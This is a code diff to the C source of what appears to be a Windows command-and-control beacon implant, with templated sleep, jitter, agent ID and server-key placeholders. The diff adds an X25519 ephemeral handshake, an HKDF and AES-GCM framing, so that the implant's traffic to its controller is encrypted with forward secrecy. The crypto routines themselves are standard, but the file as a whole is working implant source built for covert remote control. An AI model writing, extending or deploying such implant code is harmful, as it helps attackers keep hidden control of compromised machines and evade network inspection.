@@ -33,6 +33,7 @@
 #define BEACON_SLEEP {{BEACON_INTERVAL}}
 #define BEACON_JITTER {{BEACON_JITTER}}
 #define USE_HTTPS {{USE_HTTPS}}
+#define SERVER_PUB "{{SERVER_X25519_PUB}}"
 
 static char g_agent_id[64] = {0};
 
@@ -99,8 +100,181 @@ static int derive_key(unsigned char out_key[32]) {
     return 1;
 }
 
+void x25519(unsigned char *q, const unsigned char *n, const unsigned char *p);
+void x25519_base(unsigned char *q, const unsigned char *n);
+
+static int hmac_sha256(const unsigned char *key, ULONG key_len, const unsigned char *data, ULONG data_len, unsigned char out[32]) {
+    BCRYPT_ALG_HANDLE hAlg = NULL;
+    BCRYPT_HASH_HANDLE hHash = NULL;
+    NTSTATUS status = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_SHA256_ALGORITHM, NULL, BCRYPT_ALG_HANDLE_HMAC_FLAG);
+    if (!BCRYPT_SUCCESS(status)) return 0;
+    status = BCryptCreateHash(hAlg, &hHash, NULL, 0, (PUCHAR)key, key_len, 0);
+    if (!BCRYPT_SUCCESS(status)) { BCryptCloseAlgorithmProvider(hAlg, 0); return 0; }
+    BCryptHashData(hHash, (PUCHAR)data, data_len, 0);
+    BCryptFinishHash(hHash, out, 32, 0);
+    BCryptDestroyHash(hHash);
+    BCryptCloseAlgorithmProvider(hAlg, 0);
+    return 1;
+}
+
+static int hex_nibble(char c) {
+    if (c >= '0' && c <= '9') return c - '0';
+    if (c >= 'a' && c <= 'f') return c - 'a' + 10;
+    if (c >= 'A' && c <= 'F') return c - 'A' + 10;
+    return -1;
+}
+
+static int parse_hex32(const char *hex, unsigned char out[32]) {
+    for (int i = 0; i < 32; i++) {
+        int hi = hex_nibble(hex[i * 2]), lo = hex_nibble(hex[i * 2 + 1]);
+        if (hi < 0 || lo < 0) return 0;
+        out[i] = (unsigned char)((hi << 4) | lo);
+    }
+    return 1;
+}
+
+static void hkdf32(const unsigned char *ikm, int ikm_len, const char *info, unsigned char out[32]) {
+    unsigned char prk[32], msg[80];
+    int n = (int)strlen(info);
+    hmac_sha256((const unsigned char *)"sockpuppets-salt-v1", 20, ikm, (ULONG)ikm_len, prk);
+    memcpy(msg, info, n);
+    msg[n] = 1;
+    hmac_sha256(prk, 32, msg, (ULONG)(n + 1), out);
+}
+
+static unsigned char *aes_gcm_raw(const unsigned char key[32], const unsigned char *data, size_t len, size_t *out_len) {
+    BCRYPT_ALG_HANDLE hAlg = NULL;
+    BCRYPT_KEY_HANDLE hKey = NULL;
+    if (!BCRYPT_SUCCESS(BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0))) return NULL;
+    BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_GCM, sizeof(BCRYPT_CHAIN_MODE_GCM), 0);
+    if (!BCRYPT_SUCCESS(BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0, (PUCHAR)key, 32, 0))) {
+        BCryptCloseAlgorithmProvider(hAlg, 0);
+        return NULL;
+    }
+    unsigned char nonce[12], tag[16];
+    BCryptGenRandom(NULL, nonce, 12, BCRYPT_USE_SYSTEM_PREFERRED_RNG);
+    BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO authInfo;
+    BCRYPT_INIT_AUTH_MODE_INFO(authInfo);
+    authInfo.pbNonce = nonce;
+    authInfo.cbNonce = 12;
+    authInfo.pbTag = tag;
+    authInfo.cbTag = 16;
+    DWORD ct_len = 0;
+    BCryptEncrypt(hKey, (PUCHAR)data, (ULONG)len, &authInfo, NULL, 0, NULL, 0, &ct_len, 0);
+    unsigned char *buf = (unsigned char *)malloc(12 + ct_len + 16);
+    DWORD wrote = 0;
+    NTSTATUS status = BCryptEncrypt(hKey, (PUCHAR)data, (ULONG)len, &authInfo, NULL, 0, buf + 12, ct_len, &wrote, 0);
+    BCryptDestroyKey(hKey);
+    BCryptCloseAlgorithmProvider(hAlg, 0);
+    if (!BCRYPT_SUCCESS(status)) { free(buf); return NULL; }
+    memcpy(buf, nonce, 12);
+    memcpy(buf + 12 + wrote, tag, 16);
+    *out_len = 12 + wrote + 16;
+    return buf;
+}
+
+static char *aes_gcm_open_raw(const unsigned char key[32], const unsigned char *blob, size_t len) {
+    if (len < 12 + 16) return NULL;
+    size_t ct_len = len - 12 - 16;
+    unsigned char tag[16];
+    memcpy(tag, blob + 12 + ct_len, 16);
+    BCRYPT_ALG_HANDLE hAlg = NULL;
+    BCRYPT_KEY_HANDLE hKey = NULL;
+    if (!BCRYPT_SUCCESS(BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0))) return NULL;
+    BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_GCM, sizeof(BCRYPT_CHAIN_MODE_GCM), 0);
+    if (!BCRYPT_SUCCESS(BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0, (PUCHAR)key, 32, 0))) {
+        BCryptCloseAlgorithmProvider(hAlg, 0);
+        return NULL;
+    }
+    BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO authInfo;
+    BCRYPT_INIT_AUTH_MODE_INFO(authInfo);
+    authInfo.pbNonce = (PUCHAR)blob;
+    authInfo.cbNonce = 12;
+    authInfo.pbTag = tag;
+    authInfo.cbTag = 16;
+    char *pt = (char *)malloc(ct_len + 1);
+    DWORD pt_len = 0;
+    NTSTATUS status = BCryptDecrypt(hKey, (PUCHAR)blob + 12, (ULONG)ct_len, &authInfo, NULL, 0, (PUCHAR)pt, (ULONG)ct_len, &pt_len, 0);
+    BCryptDestroyKey(hKey);
+    BCryptCloseAlgorithmProvider(hAlg, 0);
+    if (!BCRYPT_SUCCESS(status)) { free(pt); return NULL; }
+    pt[pt_len] = 0;
+    return pt;
+}
+
+static unsigned char g_session[32], g_hs[32], g_eph[32];
+static int g_have_session = 0, g_have_eph = 0;
+
+static char *wire_encrypt(const char *data, size_t len) {
+    if (g_have_session) {
+        size_t slen = 0;
+        unsigned char *sealed = aes_gcm_raw(g_session, (const unsigned char *)data, len, &slen);
+        if (!sealed) return NULL;
+        unsigned char *framed = (unsigned char *)malloc(4 + slen);
+        memcpy(framed, "AES1", 4);
+        memcpy(framed + 4, sealed, slen);
+        free(sealed);
+        size_t b64len;
+        char *out = base64_encode(framed, 4 + slen, &b64len);
+        free(framed);
+        return out;
+    }
+    unsigned char server_pub[32];
+    if (!parse_hex32(SERVER_PUB, server_pub)) return NULL;
+    BCryptGenRandom(NULL, g_eph, 32, BCRYPT_USE_SYSTEM_PREFERRED_RNG);
+    unsigned char eph_pub[32], shared[32];
+    x25519_base(eph_pub, g_eph);
+    x25519(shared, g_eph, server_pub);
+    hkdf32(shared, 32, "sockpuppets-handshake-v1", g_hs);
+    g_have_eph = 1;
+    size_t slen = 0;
+    unsigned char *sealed = aes_gcm_raw(g_hs, (const unsigned char *)data, len, &slen);
+    if (!sealed) return NULL;
+    unsigned char *raw = (unsigned char *)malloc(32 + slen);
+    memcpy(raw, eph_pub, 32);
+    memcpy(raw + 32, sealed, slen);
+    free(sealed);
+    size_t b64len;
+    char *b64 = base64_encode(raw, 32 + slen, &b64len);
+    free(raw);
+    char *out = (char *)malloc(5 + b64len + 1);
+    memcpy(out, "EPH1.", 5);
+    memcpy(out + 5, b64, b64len + 1);
+    free(b64);
+    return out;
+}
+
+static char *wire_decrypt(const char *data) {
+    if (strncmp(data, "EPH2.", 5) == 0) {
+        size_t rawlen;
+        unsigned char *raw = base64_decode(data + 5, strlen(data + 5), &rawlen);
+        if (!raw || rawlen < 32 || !g_have_eph) { free(raw); return NULL; }
+        unsigned char shared2[32];
+        x25519(shared2, g_eph, raw);
+        unsigned char ikm[64];
+        memcpy(ikm, shared2, 32);
+        memcpy(ikm + 32, g_hs, 32);
+        hkdf32(ikm, 64, "sockpuppets-session-v1", g_session);
+        g_have_session = 1;
+        g_have_eph = 0;
+        char *pt = aes_gcm_open_raw(g_hs, raw + 32, rawlen - 32);
+        free(raw);
+        return pt;
+    }
+    size_t rawlen;
+    unsigned char *raw = base64_decode(data, strlen(data), &rawlen);
+    if (!raw || rawlen < 4 || memcmp(raw, "AES1", 4) != 0 || !g_have_session) { free(raw); return NULL; }
+    char *pt = aes_gcm_open_raw(g_session, raw + 4, rawlen - 4);
+    free(raw);
+    return pt;
+}
+
 /* AES-256-GCM encrypt: returns base64("AES1" + nonce12 + ciphertext + tag16) */
 static char* aes_encrypt(const char *data, size_t len) {
+    if (SERVER_PUB[0] != '{') {
+        char *wired = wire_encrypt(data, len);
+        if (wired) return wired;
+    }
     unsigned char key[32];
     if (!derive_key(key)) return NULL;
 
@@ -156,6 +330,10 @@ static char* aes_encrypt(const char *data, size_t len) {
 
 /* AES-256-GCM decrypt: input is base64("AES1" + nonce12 + ciphertext + tag16) */
 static char* aes_decrypt(const char *b64data) {
+    if (SERVER_PUB[0] != '{') {
+        char *wired = wire_decrypt(b64data);
+        if (wired) return wired;
+    }
     size_t rawlen;
     unsigned char *raw = base64_decode(b64data, strlen(b64data), &rawlen);
     if (!raw) return NULL;
